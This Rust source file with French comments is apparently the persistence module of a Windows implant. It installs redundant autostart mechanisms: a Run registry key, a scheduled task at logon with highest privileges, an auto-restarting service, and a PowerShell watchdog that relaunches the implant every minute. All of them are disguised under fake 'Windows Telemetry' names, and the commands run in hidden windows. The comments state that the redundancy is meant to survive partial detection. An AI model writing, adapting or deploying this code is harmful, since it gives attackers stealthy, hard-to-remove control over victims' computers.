// Trois mécanismes de persistance indépendants (Windows uniquement) :
//   1. Clé Run HKCU
//   2. Tâche planifiée (schtasks)
//   3. Service Windows (sc.exe)
// La détection d'un seul n'empêche pas la reprise par les autres.

const RUN_KEY: &str = r"Software\Microsoft\Windows\CurrentVersion\Run";
const RUN_VALUE: &str = "WindowsTelemetry";
const TASK_PATH: &str = r"\Microsoft\Windows\WindowsTelemetry";
const TASK_NAME: &str = "TelemetryCheck";
const SERVICE_NAME: &str = "WinTelemetrySvc";

pub fn install() -> String {
    #[cfg(not(windows))]
    return "persistance disponible sur Windows uniquement".to_string();

    #[cfg(windows)]
    {
        let exe = current_exe();
        let mut report = Vec::new();
        push_result(&mut report, "run_key",  install_run_key(&exe));
        push_result(&mut report, "tache",    install_task(&exe));
        push_result(&mut report, "service",  install_service(&exe));
        push_result(&mut report, "watchdog", install_watchdog(&exe));
        report.join("\n")
    }
}

pub fn remove() -> String {
    #[cfg(not(windows))]
    return "désinstallation disponible sur Windows uniquement".to_string();

    #[cfg(windows)]
    {
        let mut report = Vec::new();
        push_result(&mut report, "cle Run",  remove_run_key());
        push_result(&mut report, "tache",    remove_task());
        push_result(&mut report, "service",  remove_service());
        push_result(&mut report, "watchdog", remove_watchdog());
        report.join("\n")
    }
}

#[cfg(windows)]
fn push_result(report: &mut Vec<String>, name: &str, r: Result<String, String>) {
    match r {
        Ok(msg)  => report.push(format!("[ok] {} : {}", name, msg)),
        Err(msg) => report.push(format!("[ko] {} : {}", name, msg)),
    }
}

#[cfg(windows)]
fn current_exe() -> String {
    std::env::current_exe()
        .map(|p| p.display().to_string())
        .unwrap_or_else(|_| "implant.exe".to_string())
}

#[cfg(windows)]
fn install_run_key(exe: &str) -> Result<String, String> {
    use std::ffi::OsStr;
    use std::os::windows::ffi::OsStrExt;
    use windows_sys::Win32::System::Registry::{
        RegCloseKey, RegCreateKeyExW, RegSetValueExW,
        HKEY_CURRENT_USER, KEY_SET_VALUE, REG_SZ, REG_OPTION_NON_VOLATILE,
    };

    let key_path: Vec<u16> = OsStr::new(RUN_KEY).encode_wide().chain(Some(0)).collect();
    let value_name: Vec<u16> = OsStr::new(RUN_VALUE).encode_wide().chain(Some(0)).collect();
    let data: Vec<u16> = OsStr::new(exe).encode_wide().chain(Some(0)).collect();

    unsafe {
        let mut hkey = 0isize;
        let mut disp = 0u32;
        let res = RegCreateKeyExW(
            HKEY_CURRENT_USER,
            key_path.as_ptr(),
            0, std::ptr::null(), REG_OPTION_NON_VOLATILE, KEY_SET_VALUE,
            std::ptr::null(), &mut hkey, &mut disp,
        );
        if res != 0 {
            return Err(format!("RegCreateKeyEx : {}", res));
        }
        let data_bytes = std::slice::from_raw_parts(
            data.as_ptr() as *const u8, data.len() * 2,
        );
        let res2 = RegSetValueExW(
            hkey, value_name.as_ptr(), 0, REG_SZ,
            data_bytes.as_ptr(), data_bytes.len() as u32,
        );
        RegCloseKey(hkey);
        if res2 != 0 {
            Err(format!("RegSetValueEx : {}", res2))
        } else {
            Ok(format!(r"HKCU\{}\{}", RUN_KEY, RUN_VALUE))
        }
    }
}

#[cfg(windows)]
fn install_task(exe: &str) -> Result<String, String> {
    let full_task = format!(r"{}\{}", TASK_PATH, TASK_NAME);
    run_cmd(&[
        "schtasks", "/create", "/f",
        "/tn", &full_task,
        "/tr", exe,
        "/sc", "onlogon",
        "/rl", "highest",
    ])
    .map(|_| full_task)
}

#[cfg(windows)]
fn install_service(exe: &str) -> Result<String, String> {
    run_cmd(&[
        "sc.exe", "create", SERVICE_NAME,
        &format!("binPath= {}", exe),
        "start= auto",
        "DisplayName= Windows Telemetry",
    ])?;
    run_cmd(&["sc.exe", "description", SERVICE_NAME, "Collects telemetry for Windows components."])?;
    run_cmd(&[
        "sc.exe", "failure", SERVICE_NAME,
        "reset= 0", "actions= restart/5000",
    ])?;
    run_cmd(&["sc.exe", "start", SERVICE_NAME])
        .map(|_| SERVICE_NAME.to_string())
        .or_else(|e| Ok(format!("{} (démarrage différé : {})", SERVICE_NAME, e)))
}

#[cfg(windows)]
fn remove_run_key() -> Result<String, String> {
    use std::ffi::OsStr;
    use std::os::windows::ffi::OsStrExt;
    use windows_sys::Win32::System::Registry::{
        RegOpenKeyExW, RegDeleteValueW, RegCloseKey,
        HKEY_CURRENT_USER, KEY_SET_VALUE,
    };

    let key_path: Vec<u16> = OsStr::new(RUN_KEY).encode_wide().chain(Some(0)).collect();
    let value_name: Vec<u16> = OsStr::new(RUN_VALUE).encode_wide().chain(Some(0)).collect();

    unsafe {
        let mut hkey = 0isize;
        let res = RegOpenKeyExW(HKEY_CURRENT_USER, key_path.as_ptr(), 0, KEY_SET_VALUE, &mut hkey);
        if res != 0 {
            return Err(format!("RegOpenKeyEx : {}", res));
        }
        let res2 = RegDeleteValueW(hkey, value_name.as_ptr());
        RegCloseKey(hkey);
        if res2 != 0 { Err(format!("RegDeleteValue : {}", res2)) } else { Ok("clé Run retirée".to_string()) }
    }
}

#[cfg(windows)]
fn remove_task() -> Result<String, String> {
    run_cmd(&["schtasks", "/delete", "/f", "/tn", &format!(r"{}\{}", TASK_PATH, TASK_NAME)])
        .map(|_| "tâche retirée".to_string())
}

#[cfg(windows)]
fn remove_service() -> Result<String, String> {
    run_cmd(&["sc.exe", "stop", SERVICE_NAME]).ok();
    run_cmd(&["sc.exe", "delete", SERVICE_NAME])
        .map(|_| "service supprimé".to_string())
}

const WATCHDOG_TASK: &str = r"\Microsoft\Windows\WindowsTelemetry\TelemetryWatchdog";

#[cfg(windows)]
fn install_watchdog(exe: &str) -> Result<String, String> {
    // Le watchdog vérifie d'abord si l'implant tourne déjà (mutex nommé).
    // La commande conditionnelle ne relance que si le mutex est absent.
    let check_cmd = format!(
        "powershell -NoProfile -Command \"$m=[Threading.Mutex]::TryOpenExisting('Global\\WinTelMtx',[ref]$null); if(-not $m){{Start-Process '{}'}}\"",
        exe
    );
    run_cmd(&[
        "schtasks", "/create", "/f",
        "/tn", WATCHDOG_TASK,
        "/tr", &check_cmd,
        "/sc", "MINUTE",
        "/mo", "1",
        "/rl", "highest",
    ])
    .map(|_| WATCHDOG_TASK.to_string())
}

#[cfg(windows)]
fn remove_watchdog() -> Result<String, String> {
    run_cmd(&["schtasks", "/delete", "/f", "/tn", WATCHDOG_TASK])
        .map(|_| "watchdog retiré".to_string())
}

#[cfg(windows)]
fn run_cmd(argv: &[&str]) -> Result<String, String> {
    use std::process::Command;
    use std::os::windows::process::CommandExt;
    let out = Command::new(argv[0])
        .args(&argv[1..])
        .creation_flags(0x08000000) // CREATE_NO_WINDOW
        .output()
        .map_err(|e| e.to_string())?;
    if out.status.success() {
        Ok(String::from_utf8_lossy(&out.stdout).to_string())
    } else {
        Err(String::from_utf8_lossy(&out.stderr).to_string())
    }
}
